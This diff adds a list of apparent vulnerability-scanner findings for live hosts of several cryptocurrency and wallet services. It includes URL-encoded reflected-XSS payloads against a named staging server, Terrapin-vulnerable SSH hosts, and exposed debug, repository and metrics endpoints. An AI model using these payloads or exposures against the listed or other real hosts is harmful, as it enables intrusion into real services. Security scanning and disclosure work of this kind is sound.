@@ -1,0 +1,17 @@
+[CVE-2005-4385] [http] [medium] https://lq1-staging.breez.technology/search.htm?searchstring2&searchstring=%27%3E%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+[CVE-2015-8349] [http] [medium] https://lq1-staging.breez.technology/index.php?p=banlist&advSearch=0%27%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&advType=btype
+[CVE-2018-13380] [http] [medium] https://lq1-staging.breez.technology/message?title=x&msg=%26%23%3Csvg/onload=alert(1337)%3E%3B
+[CVE-2018-13380] [http] [medium] https://lq1-staging.breez.technology/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E
+[CVE-2019-1010287] [http] [medium] https://lq1-staging.breez.technology/timesheet/login.php
+[CVE-2023-48795] [javascript] [medium] card.mycelium.com:22 ["Vulnerable to Terrapin"]
+[CVE-2023-48795] [javascript] [medium] crashhub.electrum.org:22 ["Vulnerable to Terrapin"]
+[CVE-2023-48795] [javascript] [medium] gear.mycelium.com:22 ["Vulnerable to Terrapin"]
+[CVE-2023-48795] [javascript] [medium] sdk-doc.breez.technology:22 ["Vulnerable to Terrapin"]
+[CVE-2023-48795] [javascript] [medium] www.bitcoincore.org:22 ["Vulnerable to Terrapin"]
+[CVE-2023-48795] [javascript] [medium] www.blog.mycelium.com:22 ["Vulnerable to Terrapin"]
+[CVE-2025-63387] [http] [medium] https://dify.nunchuk.io/console/api/system-features
+[CVE-2026-32230] [http] [medium] https://status.unisat.io/api/badge/1/ping/24
+[django-debug-config-enabled] [http] [medium] https://cars.mycelium.com/NON_EXISTING_PATH/
+[forgejo-repo-exposure] [http] [medium] https://git.wasabiwallet.io/explore/repos
+[laravel-debugbar-exposure] [http] [medium] https://cms-test.leather.io/_debugbar/open
+[prometheus-metrics] [http] [medium] https://waterfalls-liquid-testnet.breez.technology/metrics
